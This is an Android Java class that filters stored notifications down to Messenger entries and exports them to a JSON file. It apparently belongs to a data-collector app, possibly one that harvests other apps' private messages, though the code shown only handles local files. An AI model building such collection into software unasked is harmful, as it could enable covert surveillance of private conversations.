package com.alzahra.collector;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;

public class MessengerCollector {
    private static final String TAG = "MessengerCollector";
    private final Context context;

    public MessengerCollector(Context context) {
        this.context = context;
    }

    public File export() {
        try {
            // Collect Messenger notifications from app storage
            File sourceFile = new File(context.getFilesDir(), "notifications/notifications.json");
            if (!sourceFile.exists()) return null;

            JSONArray messengerMessages = new JSONArray();
            BufferedReader reader = new BufferedReader(new FileReader(sourceFile));
            String line;

            while ((line = reader.readLine()) != null) {
                line = line.trim();
                if (line.isEmpty()) continue;
                try {
                    JSONObject notif = new JSONObject(line);
                    if ("MESSENGER".equals(notif.optString("category"))) {
                        messengerMessages.put(notif);
                    }
                } catch (Exception e) {
                    // Skip malformed
                }
            }
            reader.close();

            if (messengerMessages.length() == 0) return null;

            // Save filtered messages
            File dir = new File(context.getFilesDir(), "exports");
            if (!dir.exists()) dir.mkdirs();

            File file = new File(dir, "messenger_" + System.currentTimeMillis() + ".json");
            FileWriter writer = new FileWriter(file);
            writer.write(messengerMessages.toString(2));
            writer.close();

            Log.d(TAG, "Messenger messages exported: " + messengerMessages.length());
            return file;

        } catch (Exception e) {
            Log.e(TAG, "Messenger export error", e);
            return null;
        }
    }
}
